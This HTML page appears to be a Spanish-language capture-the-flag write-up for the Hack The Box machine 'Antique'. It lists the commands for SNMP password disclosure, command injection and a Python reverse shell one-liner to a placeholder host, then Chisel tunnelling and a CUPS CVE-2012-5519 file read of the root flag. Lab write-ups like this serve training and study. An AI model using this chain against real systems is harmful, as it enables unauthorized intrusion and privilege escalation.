<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Antique</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Antique</h1><br/><p><ol><li>Realizo un escaneo de puertos</br><strong> nmap 10.10.11.107 -Pn -sC -sV -p- --open -T4</strong> </li><li>Encuentro telnet pero no puedo acceder a el porque no tengo la pass </li><li>Procedo a hacer una enumeracion de puertos UDP </br><strong>nmap 10.10.11.107 -sU --top-ports 20 -sV</strong> </li><li>Encuentro la version snmp </li></ol><img src="images/78-1.png" alt="images/78-1.png" /></p><p><ol><li>realizo un footprint de servicio   </br><strong> snmpwalk -v 2c -c public 10.10.11.107</strong> </li></ol><img src="images/78-2.png" alt="images/78-2.png" /></p><p><ol><li> Esta version de printer tiene la vulnerabilidad <code> Printer SNMP JetAdmin Device Password Disclosure Vulnerability</code> (CVE-2002-1048 Detail)</li></ol></p><p><ol><li> Parece ser que la contraseña se almacena en una variable SNMP. Si solicito la variable especifica me devolverá la contraseña codificada en hexadecimal.<strong> snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0</strong></li></ol></p><p><ol><li>Descodifico la pass </li></ol><img src="images/78-3.png" alt="images/78-3.png" /></p><p><ol><li>Despues de meter la contraseña obtengo un prompt. </li></ol><img src="images/78-4.png" alt="images/78-4.png" /></p><p><ol><li>Es vulnerable a comand injection </li></ol><img src="images/78-5.png" alt="images/78-5.png" /></p><p><ol><li>Obtengo un reverse shell <strong>  exec python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</strong></li></ol></p><p><ol><li>Uso linpeas y encuentro que hay algo interno que está escuchando </li></ol><img src="images/78-6.png" alt="images/78-6.png" /></p><p><ol><li>Tengo que hacer un Tunneling a través de SSH.</li></ol></p><p><ol><li>Para el Tunneling usaré Chisel  </li></ol><img src="images/78-7.png" alt="images/78-7.png" /><strong> ./chisel_1.7.7_linux_amd64 client &lt;IP&gt;:9000 R:9631:localhost:631</strong></li></p><p><ol><li>Accedo a la página web </li></ol><img src="images/78-8.png" alt="images/78-8.png" /></p><p><ol><li>CUPS 1.6.1 tiene el <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-5519">CVE-2012_5519</a></li></ol></p><p><ol><li>Este módulo imprime por pantalla la ubicación del log de error.  Además, aquellos usuarios del grupo lpadmin son capaces de modificar dicha ubicación con el comando cupsctl. Comprobamos que pertenecemos a dicho grupo.</br><strong> lp@antique:~$ cupsctl ErrorLog=&quot;/root/root.txt&quot;</strong></li></ol></p><p><ol><li>Encuentro la flag de root </li></ol><img src="images/78-9.png" alt="images/78-9.png" /></p></div>
</body>
</html>
